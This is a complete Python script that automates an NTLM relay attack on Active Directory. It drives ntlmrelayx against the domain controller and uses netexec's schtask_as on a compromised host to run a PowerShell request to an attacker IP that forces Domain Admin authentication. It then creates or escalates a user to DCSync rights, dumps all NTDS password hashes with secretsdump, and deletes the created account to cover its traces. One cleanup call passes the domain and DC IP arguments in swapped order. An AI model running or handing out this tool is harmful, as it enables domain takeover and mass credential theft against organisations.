#!/usr/bin/env python3
"""
NTLM Relay Automation Script - Clean & Visual Edition
Description: Automates NTLM relay to escalate privileges or dump NTDS, with automatic cleanup.
Author: Faust
Modifications:
- --no-ldaps: alternative flow when DC doesn't support LDAPS.
- Cleanup prioritizes bloodyad over netexec.
"""

import argparse
import subprocess
import sys
import time
import threading
import re
from datetime import datetime
import os
import secrets
import string

# Try to import colorama for colors
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    COLORS = True
except ImportError:
    COLORS = False
    class Fore:
        RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = WHITE = RESET = ''
    class Style:
        BRIGHT = DIM = NORMAL = RESET_ALL = ''

# Try to import rich for tables
try:
    from rich.console import Console
    from rich.table import Table
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False

args = None
stop_event = threading.Event()

def colorize(text, color=Fore.WHITE, bright=False):
    if COLORS:
        style = Style.BRIGHT if bright else Style.NORMAL
        return f"{color}{style}{text}{Style.RESET_ALL}"
    return text

def print_status(message, level="info"):
    """Print formatted status messages with timestamp and level tag (no emojis)."""
    timestamp = datetime.now().strftime("%H:%M:%S")
    labels = {
        "info": "INFO",
        "success": "SUCCESS",
        "error": "ERROR",
        "warning": "WARNING",
        "step": "STEP",
        "wait": "WAIT",
        "target": "TARGET"
    }
    colors = {
        "info": Fore.BLUE,
        "success": Fore.GREEN,
        "error": Fore.RED,
        "warning": Fore.YELLOW,
        "step": Fore.MAGENTA,
        "wait": Fore.CYAN,
        "target": Fore.YELLOW
    }
    label = labels.get(level, "INFO")
    color = colors.get(level, Fore.WHITE)
    prefix = f"[{timestamp}]"
    if COLORS:
        print(f"{Fore.WHITE}{prefix} {color}[{label}]{Style.RESET_ALL} {message}")
    else:
        print(f"{prefix} [{label}] {message}")

def print_summary():
    """Print a summary of the attack parameters."""
    print_status("Attack Parameters", "step")
    print(colorize(" ─────────────────────────────────────────────────────────", Fore.CYAN))
    print(f"   {colorize('Target Host', Fore.YELLOW)} : {args.target_host}")
    print(f"   {colorize('DC IP', Fore.YELLOW)}       : {args.dc_ip}")
    if args.domain:
        print(f"   {colorize('Domain', Fore.YELLOW)}      : {args.domain}")
    if args.relay_protocol:
        print(f"   {colorize('Relay Proto', Fore.YELLOW)} : {args.relay_protocol.upper()}")
    if args.escalate_user:
        print(f"   {colorize('Escalate User', Fore.YELLOW)}: {args.escalate_user}")
    else:
        print(f"   {colorize('Mode', Fore.YELLOW)}         : {colorize('Create user + DCSync', Fore.GREEN)}")
    if args.no_ldaps and not args.escalate_user:
        print(f"   {colorize('LDAPS', Fore.YELLOW)}         : {colorize('DISABLED (alternative flow)', Fore.RED)}")
    print(colorize(" ─────────────────────────────────────────────────────────", Fore.CYAN))

def print_hashes_table(hashes):
    """Print NTDS hashes in a formatted table."""
    if not hashes:
        print_status("No hashes to display.", "warning")
        return

    if RICH_AVAILABLE:
        console = Console()
        table = Table(title="Dumped NTDS Hashes", style="bright_cyan")
        table.add_column("Username", style="cyan", no_wrap=True)
        table.add_column("RID", style="yellow")
        table.add_column("NTLM Hash", style="green")
        for user, rid, ntlm in hashes:
            table.add_row(user, str(rid), ntlm)
        console.print(table)
    else:
        # ASCII fallback
        border = "┌" + "─" * 25 + "┬" + "─" * 6 + "┬" + "─" * 34 + "┐"
        header = "│ {:23} │ {:4} │ {:32} │".format("Username", "RID", "NTLM Hash")
        separator = "├" + "─" * 25 + "┼" + "─" * 6 + "┼" + "─" * 34 + "┤"
        footer = "└" + "─" * 25 + "┴" + "─" * 6 + "┴" + "─" * 34 + "┘"

        print(colorize(border, Fore.CYAN))
        print(colorize(header, Fore.WHITE, bright=True))
        print(colorize(separator, Fore.CYAN))
        for user, rid, ntlm in hashes:
            row = "│ {:23} │ {:4} │ {:32} │".format(
                user[:23],
                str(rid)[:4],
                ntlm[:32]
            )
            print(colorize(row, Fore.GREEN))
        print(colorize(footer, Fore.CYAN))

def run_command(cmd, capture_output=False, check=False, timeout=None, input_data=None):
    """Run a shell command with optional capturing."""
    if args.verbose:
        print_status(f"Running: {' '.join(cmd)}", "info")
    try:
        if capture_output:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout,
                                    check=check, input=input_data)
            return result.returncode, result.stdout, result.stderr
        else:
            subprocess.run(cmd, check=check, timeout=timeout, input=input_data)
            return 0, "", ""
    except subprocess.TimeoutExpired:
        print_status(f"Command timed out after {timeout}s", "error")
        return -1, "", "Timeout"
    except subprocess.CalledProcessError as e:
        print_status(f"Command failed with return code {e.returncode}", "error")
        if capture_output:
            return e.returncode, e.stdout, e.stderr
        return e.returncode, "", str(e)

def monitor_relay_output(process, timeout):
    """Monitor ntlmrelayx output and extract credentials."""
    result = {
        'success': False,
        'mode': None,
        'new_user': None,
        'new_password': None,
        'domain': None
    }
    start_time = time.time()
    user_created = False

    def check_line(line):
        nonlocal user_created
        line = line.strip()
        if not line:
            return
        if args.verbose:
            print_status(f"[ntlmrelayx] {line}", "info")

        # Extract domain
        dc_match = re.search(r'in: CN=Users,DC=([^,]+),DC=([^,]+)', line, re.IGNORECASE)
        if dc_match and not result['domain']:
            result['domain'] = f"{dc_match.group(1)}.{dc_match.group(2)}"

        # New user creation (only in normal flow)
        create_match = re.search(r'Adding new user with username: (\S+) and password: (\S+)', line, re.IGNORECASE)
        if create_match:
            result['new_user'] = create_match.group(1)
            result['new_password'] = create_match.group(2)
            user_created = True
            print_status(f"New user created: {result['new_user']} (Pass: {result['new_password']})", "success")

        # Escalation success for existing user (used in alternative flow)
        if re.search(r'Privilege escalation succesful', line, re.IGNORECASE):
            result['success'] = True
            result['mode'] = 'escalate'
            print_status("Privilege escalation successful (existing user).", "success")

        # New user granted DCSync (normal flow)
        if re.search(r'Success! User .* now has Replication-Get-Changes-All privileges', line, re.IGNORECASE):
            if user_created:
                result['success'] = True
                result['mode'] = 'create_user'
                print_status("DCSync privileges successfully granted to ephemeral user.", "success")

    def reader(stream):
        for line in iter(stream.readline, ''):
            if stop_event.is_set():
                break
            check_line(line)

    stdout_thread = threading.Thread(target=reader, args=(process.stdout,))
    stderr_thread = threading.Thread(target=reader, args=(process.stderr,))
    stdout_thread.daemon = True
    stderr_thread.daemon = True
    stdout_thread.start()
    stderr_thread.start()

    while not stop_event.is_set():
        if result['success']:
            break
        if process.poll() is not None:
            print_status("ntlmrelayx process exited.", "info")
            break
        if time.time() - start_time > timeout:
            print_status(f"Timeout ({timeout}s) reached.", "error")
            stop_event.set()
            break
        time.sleep(1)

    return result

def cleanup_created_user(username, dc_ip, domain, admin_hash=None):
    """Delete the created user using bloodyad (preferred) or netexec (fallback)."""
    if args.no_cleanup:
        print_status("Cleanup disabled by --no-cleanup flag.", "warning")
        return True

    print_status(f"Attempting to remove user '{username}'...", "step")

    # Try bloodyad first if admin_hash is provided
    if admin_hash:
        print_status("Trying bloodyad with admin hash...", "info")
        # Try with "Administrador" (Spanish)
        bloodyad_cmd = [
            "bloodyad",
            "-H", dc_ip,
            "-d", domain,
            "-u", "Administrador",
            "-p", f":{admin_hash}",
            "remove", "object", username
        ]
        ret, stdout, stderr = run_command(bloodyad_cmd, capture_output=True, timeout=30)
        if ret == 0:
            print_status(f"User '{username}' removed successfully via bloodyad (Administrador).", "success")
            return True
        # Try with "Administrator" (English)
        bloodyad_cmd[5] = "Administrator"
        ret2, stdout2, stderr2 = run_command(bloodyad_cmd, capture_output=True, timeout=30)
        if ret2 == 0:
            print_status(f"User '{username}' removed successfully via bloodyad (Administrator).", "success")
            return True
        else:
            print_status("Bloodyad removal failed, falling back to netexec...", "warning")

    # Fallback to netexec using local admin credentials
    del_cmd = f'net user {username} /domain /delete'
    ret, out, err = execute_netexec_command(del_cmd, timeout=60)
    if ret == 0:
        print_status(f"User '{username}' removed successfully via netexec.", "success")
        return True
    else:
        print_status(f"Cleanup failed. You may need to manually remove user '{username}'.", "error")
        if args.verbose:
            if err:
                print(err)
        return False

def generate_random_username(prefix="usr"):
    """Generate a random username (8 chars alphanumeric)."""
    return prefix + ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(6))

def generate_random_password(length=14):
    """Generate a secure random password."""
    alphabet = string.ascii_letters + string.digits + "!@#$%^&*"
    return ''.join(secrets.choice(alphabet) for _ in range(length))

def execute_netexec_command(cmd_parts, timeout=60):
    """Execute a netexec command with schtask_as module.
       cmd_parts: the actual command to execute, e.g. 'net user ... /domain /add'
    """
    netexec_base = [
        "netexec", "smb", args.target_host,
        "-u", args.local_user,
        "-p", args.local_pass,
    ]
    if not args.no_local_auth:
        netexec_base.append("--local-auth")
    netexec_base.extend(["-M", "schtask_as", "-o", f"USER={args.domain_admin_user}", "CMD=" + cmd_parts])
    # Remove empty strings
    full_cmd = [x for x in netexec_base if x]
    ret, stdout, stderr = run_command(full_cmd, capture_output=True, timeout=timeout)
    return ret, stdout, stderr

def parse_arguments():
    parser = argparse.ArgumentParser(
        description="Automated NTLM Relay - Escalate or DCSync with cleanup",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Modes:
  1) Escalate existing user (relay): provide --escalate-user USER and --relay-protocol.
  2) Create new user and DCSync via relay (default): omit --escalate-user, requires --domain.
     - If DC supports LDAPS, use ldaps (default).
     - If DC does NOT support LDAPS, use --no-ldaps to enable alternative flow:
         create user via netexec, then relay to escalate that user, then dump.
        """
    )
    mandatory = parser.add_argument_group("Mandatory arguments")
    mandatory.add_argument("--target-host", required=True, help="IP of compromised machine (CLIENT02).")
    mandatory.add_argument("--local-user", required=True, help="Local admin username.")
    mandatory.add_argument("--local-pass", required=True, help="Password for local admin.")
    mandatory.add_argument("--domain-admin-user", required=True, help="Domain Admin user to impersonate (for schtask_as).")
    mandatory.add_argument("--attacker-ip", required=True, help="Attacker IP for relay listener.")
    mandatory.add_argument("--dc-ip", required=True, help="IP of Domain Controller.")

    optional = parser.add_argument_group("Optional arguments (mode-dependent)")
    optional.add_argument("--escalate-user", default=None, help="Existing user to escalate.")
    optional.add_argument("--domain", default=None, help="Domain FQDN (required if no --escalate-user).")
    optional.add_argument("--relay-protocol", default=None, choices=["ldap", "ldaps", "smb"],
                          help="Relay protocol (default: ldaps if creating user, else required).")
    optional.add_argument("--http-port", type=int, default=80, help="HTTP port (default: 80).")
    optional.add_argument("--trigger-uri", default="/hola", help="Trigger URI (default: /hola).")
    optional.add_argument("--no-local-auth", action="store_true", help="Use domain auth instead of local for netexec.")
    optional.add_argument("--no-cleanup", action="store_true", help="Don't delete created user.")
    optional.add_argument("--timeout", type=int, default=120, help="Timeout in seconds (default: 120).")
    optional.add_argument("--verbose", action="store_true", help="Enable verbose output.")
    optional.add_argument("--output-hashes", default=None, help="File to save dumped hashes.")

    # New argument for alternative flow
    optional.add_argument("--no-ldaps", action="store_true", help="Use LDAP without TLS (alternative flow) when DC doesn't support LDAPS.")

    return parser.parse_args()

def main():
    global args
    args = parse_arguments()

    # Validate and set up modes
    if args.escalate_user is None:
        # Create user mode (normal or alternative)
        if args.domain is None:
            print_status("When --escalate-user is not provided, --domain is required.", "error")
            sys.exit(1)
        # If --no-ldaps is set, we use alternative flow (create user via netexec, then relay to escalate)
        if args.no_ldaps:
            # Force relay protocol to ldap (no TLS)
            if args.relay_protocol is None:
                args.relay_protocol = "ldap"
            elif args.relay_protocol == "ldaps":
                print_status("--no-ldaps set, switching to 'ldap' protocol.", "warning")
                args.relay_protocol = "ldap"
            # We will not use ntlmrelayx to create the user; we'll do it manually.
        else:
            # Normal flow: use ldaps by default
            if args.relay_protocol is None:
                args.relay_protocol = "ldaps"
                print_status("--relay-protocol forced to 'ldaps' (create user mode).", "info")
            elif args.relay_protocol != "ldaps":
                print_status("Forcing --relay-protocol to 'ldaps' for user creation mode.", "warning")
                args.relay_protocol = "ldaps"
    else:
        # Escalate existing user
        if args.relay_protocol is None:
            print_status("--relay-protocol is required when escalating an existing user.", "error")
            sys.exit(1)
        # --no-ldaps is irrelevant here; respect user's choice.

    # Print summary
    print_summary()

    # --------------------------------------------
    # RELAY MODE
    # --------------------------------------------
    # Determine if we are in the alternative flow (--no-ldaps and no --escalate-user)
    alternative_flow = args.no_ldaps and args.escalate_user is None

    if alternative_flow:
        print_status("Alternative flow: DC does not support LDAPS. Will create user via netexec and relay to escalate it.", "step")
        # Generate random credentials
        new_user = generate_random_username()
        new_pass = generate_random_password()
        print_status(f"Generated new user: {new_user}", "info")
        if args.verbose:
            print_status(f"Password: {new_pass}", "info")

        # Create user in domain
        create_cmd = f'net user {new_user} {new_pass} /domain /add'
        print_status(f"Creating user '{new_user}' on domain...", "step")
        ret, out, err = execute_netexec_command(create_cmd, timeout=60)
        if ret != 0:
            print_status("Failed to create user.", "error")
            if args.verbose:
                print(err)
            sys.exit(1)
        print_status(f"User '{new_user}' created successfully.", "success")

        # Set escalate_user to the newly created user
        args.escalate_user = new_user
        # Store password for later dump
        alt_user_pass = new_pass
        alt_user = new_user

    # Prepare relay command
    relay_cmd = [
        "impacket-ntlmrelayx",
        "-smb2support",
        "-t", f"{args.relay_protocol}://{args.dc_ip}",
        "--no-dump"
    ]
    if args.escalate_user:
        relay_cmd.extend(["--escalate-user", args.escalate_user])
    if args.verbose:
        relay_cmd.append("-debug")

    print_status("Initializing ntlmrelayx backend...", "wait")
    try:
        relay_process = subprocess.Popen(
            relay_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
    except FileNotFoundError:
        print_status("impacket-ntlmrelayx not found. Please install impacket.", "error")
        sys.exit(1)

    time.sleep(5)

    # Trigger authentication
    auth_flag = "" if args.no_local_auth else "--local-auth"
    trigger_url = f"http://{args.attacker_ip}:{args.http_port}{args.trigger_uri}"

    netexec_cmd = [
        "netexec", "smb", args.target_host,
        "-u", args.local_user,
        "-p", args.local_pass,
        auth_flag,
        "-M", "schtask_as",
        "-o", f"USER={args.domain_admin_user}",
        "CMD=" + f'powershell -Command "Invoke-WebRequest -Uri {trigger_url} -UseDefaultCredentials"'
    ]
    netexec_cmd = [x for x in netexec_cmd if x]

    print_status("Triggering authentication via NetExec (schtask_as)...", "step")
    try:
        result = subprocess.run(netexec_cmd, capture_output=True, text=True, timeout=60)
        if result.returncode != 0:
            print_status("Trigger execution failed.", "error")
            if args.verbose:
                print(result.stderr)
            relay_process.terminate()
            sys.exit(1)
        else:
            print_status("Trigger executed successfully!", "success")
    except subprocess.TimeoutExpired:
        print_status("Trigger timed out.", "error")
        relay_process.terminate()
        sys.exit(1)
    except FileNotFoundError:
        print_status("netexec (nxc) not found. Please install netexec.", "error")
        relay_process.terminate()
        sys.exit(1)

    print_status("Waiting for relay execution...", "wait")
    relay_result = monitor_relay_output(relay_process, args.timeout)

    # Cleanup relay process
    if relay_process.poll() is None:
        print_status("Cleaning up relay processes...", "info")
        relay_process.terminate()
        try:
            relay_process.wait(timeout=10)
        except subprocess.TimeoutExpired:
            relay_process.kill()
            relay_process.wait()

    if not relay_result['success']:
        print_status("Relay attack failed. See logs for details.", "error")
        # If alternative flow, we may want to clean up the created user
        if alternative_flow:
            print_status("Attempting cleanup of created user...", "warning")
            # Try to delete via netexec (local admin) as fallback (bloodyad not available)
            del_cmd = f'net user {alt_user} /domain /delete'
            ret, out, err = execute_netexec_command(del_cmd, timeout=60)
            if ret == 0:
                print_status(f"User '{alt_user}' deleted successfully.", "success")
            else:
                print_status(f"Cleanup failed. You may need to manually remove user '{alt_user}'.", "error")
        sys.exit(1)

    # Handle success
    if args.escalate_user and alternative_flow:
        # In alternative flow, the user was escalated, now dump with its credentials
        print_status(f"User '{alt_user}' escalated successfully. Proceeding to dump hashes.", "success")
        # Dump NTDS
        print_status("Dumping NTDS via DRSUAPI...", "step")
        secretsdump_cmd = [
            "impacket-secretsdump",
            f"{args.domain}/{alt_user}:{alt_user_pass}@{args.dc_ip}",
            "-just-dc-ntlm",
            "-dc-ip", args.dc_ip
        ]
        if args.output_hashes:
            secretsdump_cmd.extend(["-outputfile", args.output_hashes])

        ret, stdout, stderr = run_command(secretsdump_cmd, capture_output=True, timeout=300)
        if ret != 0:
            print_status("secretsdump failed.", "error")
            if args.verbose:
                print(stderr)
            # Cleanup before exit
            del_cmd = f'net user {alt_user} /domain /delete'
            ret_del, _, _ = execute_netexec_command(del_cmd, timeout=60)
            if ret_del != 0:
                print_status(f"Cleanup failed. You may need to manually remove user '{alt_user}'.", "error")
            sys.exit(1)

        # Parse output for table
        hash_lines = []
        admin_hash = None
        for line in stdout.splitlines():
            if ':' in line and not line.startswith('['):
                parts = line.split(':')
                if len(parts) >= 4:
                    user = parts[0]
                    rid = parts[1]
                    ntlm = parts[3] if len(parts) > 3 else ''
                    if ntlm and ntlm != '31d6cfe0d16ae931b73c59d7e0c089c0':
                        hash_lines.append((user, rid, ntlm))
                        if rid == '500' or user.lower() in ['administrador', 'administrator']:
                            admin_hash = ntlm
                            print_status(f"Found admin hash: {ntlm} (RID 500)", "success")

        if hash_lines:
            print_hashes_table(hash_lines)
        else:
            print_status("No useful hashes found.", "error")
            if args.verbose:
                print("--- secretsdump stdout ---")
                print(stdout)
                print("--- secretsdump stderr ---")
                print(stderr)
            # Cleanup before exit
            del_cmd = f'net user {alt_user} /domain /delete'
            ret_del, _, _ = execute_netexec_command(del_cmd, timeout=60)
            if ret_del != 0:
                print_status(f"Cleanup failed. You may need to manually remove user '{alt_user}'.", "error")
            sys.exit(1)

        if args.output_hashes:
            print_status(f"Hashes saved to {args.output_hashes}", "success")

        # Cleanup: delete created user using bloodyad (preferred)
        cleanup_created_user(alt_user, args.dc_ip, args.domain, admin_hash)

        print_status("NTDS hashes dumped successfully. Task finished.", "success")
        sys.exit(0)

    elif args.escalate_user and not alternative_flow:
        # Normal escalation of existing user (provided by user)
        print_status(f"User '{args.escalate_user}' escalated successfully.", "success")
        print_status("You can now use DCSync with this user.", "info")
        sys.exit(0)

    else:
        # Normal flow: ntlmrelayx created user and granted DCSync
        if not relay_result['new_user'] or not relay_result['new_password']:
            print_status("New user credentials could not be extracted.", "error")
            sys.exit(1)

        username = relay_result['new_user']
        password = relay_result['new_password']
        domain = args.domain
        if not domain and relay_result['domain']:
            domain = relay_result['domain']
            print_status(f"Domain extracted from relay output: {domain}", "info")

        if not domain:
            print_status("Domain not provided and could not be extracted.", "error")
            sys.exit(1)

        print_status("Dumping NTDS via DRSUAPI...", "step")
        secretsdump_cmd = [
            "impacket-secretsdump",
            f"{domain}/{username}:{password}@{args.dc_ip}",
            "-just-dc-ntlm",
            "-dc-ip", args.dc_ip
        ]
        if args.output_hashes:
            secretsdump_cmd.extend(["-outputfile", args.output_hashes])

        ret, stdout, stderr = run_command(secretsdump_cmd, capture_output=True, timeout=300)
        if ret != 0:
            print_status("secretsdump failed.", "error")
            if args.verbose:
                print(stderr)
            sys.exit(1)

        # Parse output for table
        hash_lines = []
        admin_hash = None
        for line in stdout.splitlines():
            if ':' in line and not line.startswith('['):
                parts = line.split(':')
                if len(parts) >= 4:
                    user = parts[0]
                    rid = parts[1]
                    ntlm = parts[3] if len(parts) > 3 else ''
                    if ntlm and ntlm != '31d6cfe0d16ae931b73c59d7e0c089c0':
                        hash_lines.append((user, rid, ntlm))
                        if rid == '500' or user.lower() in ['administrador', 'administrator']:
                            admin_hash = ntlm
                            print_status(f"Found admin hash: {ntlm} (RID 500)", "success")

        if hash_lines:
            print_hashes_table(hash_lines)
        else:
            print_status("No useful hashes found.", "error")
            if args.verbose:
                print("--- secretsdump stdout ---")
                print(stdout)
                print("--- secretsdump stderr ---")
                print(stderr)
            sys.exit(1)

        if args.output_hashes:
            print_status(f"Hashes saved to {args.output_hashes}", "success")

        # Cleanup: delete created user (prefer bloodyad)
        cleanup_created_user(username, domain, args.dc_ip, admin_hash)

        print_status("NTDS hashes dumped successfully. Task finished.", "success")
        sys.exit(0)

if __name__ == "__main__":
    main()